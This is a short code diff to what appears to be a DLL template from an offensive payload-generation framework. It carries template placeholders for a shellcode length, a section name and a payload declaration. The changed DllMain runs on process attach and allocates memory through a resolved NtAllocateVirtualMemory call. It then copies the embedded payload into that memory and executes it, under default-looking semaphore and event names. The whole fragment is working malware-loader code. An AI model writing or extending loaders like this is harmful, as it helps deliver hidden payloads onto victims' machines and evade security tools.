@@ -8,7 +8,8 @@
 #define SCSIZE <%= payload_length %>
 
 auto bPayload __attribute__((section("<%= section_name %>"))) = <%= payload_declaration %>;
-char finalPayload[<%= payload_length %>];
+//char finalPayload[<%= payload_length %>];
+PVOID finalPayload;
 
 char szSyncNameS[MAX_PATH] = "Local\\Semaphore:Default\0";
 char szSyncNameE[MAX_PATH] = "Local\\Event:Default\0";
@@ -48,9 +49,17 @@ INLINE int ExecutePayload(void);
 
 BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
 {
+  NTSTATUS STATUS = 0;
+  SIZE_T scsize_t = SCSIZE;
+
 	switch (dwReason)
 	{
 		case DLL_PROCESS_ATTACH:
+      STATUS = CALL_EXPORT("ntdll.dll", "NtAllocateVirtualMemory", int(*)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG), (HANDLE)-1, &finalPayload, 0, &scsize_t, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+      
+      if (STATUS != 0) {
+        return 1;
+      }
       memcpy(finalPayload, bPayload, SCSIZE);
 			ExecutePayload();
 			break;
